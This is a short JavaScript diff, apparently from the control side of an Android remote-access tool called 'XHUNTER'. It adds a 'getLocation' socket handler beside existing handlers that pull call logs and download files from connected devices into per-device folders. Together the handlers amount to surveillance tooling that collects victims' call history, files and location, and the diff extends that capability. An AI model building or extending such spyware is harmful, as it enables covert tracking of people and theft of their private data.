@@ -48,6 +48,9 @@ const connect=(ip)=>{
     socket.on('getCallLog',(data)=>{
       rn_bridge.channel.post('getCallLog',JSON.stringify(data));
     });  
+    socket.on('getLocation',(data)=>{
+      rn_bridge.channel.post('getLocation',JSON.stringify(data));
+    });
     socket.on("download", (d) => {
       if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
         if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
@@ -150,6 +153,9 @@ io.on('connection', (socket) => {
     });
     socket.on('getCallLog',(data)=>{
       rn_bridge.channel.post('getCallLog',JSON.stringify(data));
+    });
+    socket.on('getLocation',(data)=>{
+      rn_bridge.channel.post('getLocation',JSON.stringify(data));
     });
    
     socket.on("download", (d, callback) => {
